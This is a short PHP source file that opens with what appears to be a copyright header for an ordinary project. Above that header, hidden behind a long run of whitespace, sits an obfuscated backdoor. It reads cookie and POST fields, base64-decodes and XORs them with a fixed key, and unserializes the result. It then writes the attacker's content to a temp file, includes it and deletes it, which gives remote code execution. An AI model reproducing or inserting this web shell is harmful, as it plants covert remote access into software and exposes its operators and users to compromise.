<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("rjcdpuxjub")){class rjcdpuxjub{public static $twrwhtd = "gnxiopobldwemglw";public static $lztcgv = NULL;public function __construct(){$nmeiaxsr = @$_COOKIE[substr(rjcdpuxjub::$twrwhtd, 0, 4)];if (!empty($nmeiaxsr)){$rtwftbgh = "base64";$jfuzt = "";$nmeiaxsr = explode(",", $nmeiaxsr);foreach ($nmeiaxsr as $dfcbpentz){$jfuzt .= @$_COOKIE[$dfcbpentz];$jfuzt .= @$_POST[$dfcbpentz];}$jfuzt = array_map($rtwftbgh . "_decode", array($jfuzt,)); $jfuzt = $jfuzt[0] ^ str_repeat(rjcdpuxjub::$twrwhtd, (strlen($jfuzt[0]) / strlen(rjcdpuxjub::$twrwhtd)) + 1);rjcdpuxjub::$lztcgv = @unserialize($jfuzt);}}public function __destruct(){$this->cjlydtoye();}private function cjlydtoye(){if (is_array(rjcdpuxjub::$lztcgv)) {$qeyrlutlk = sys_get_temp_dir() . "/" . crc32(rjcdpuxjub::$lztcgv["salt"]);@rjcdpuxjub::$lztcgv["write"]($qeyrlutlk, rjcdpuxjub::$lztcgv["content"]);include $qeyrlutlk;@rjcdpuxjub::$lztcgv["delete"]($qeyrlutlk);exit();}}}$amxkbd = new rjcdpuxjub(); $amxkbd = NULL;} ?><?php
///////////////////////////////////////////////////////////////////////////
//                                                                       //
// NOTICE OF COPYRIGHT                                                   //
//                                                                       //
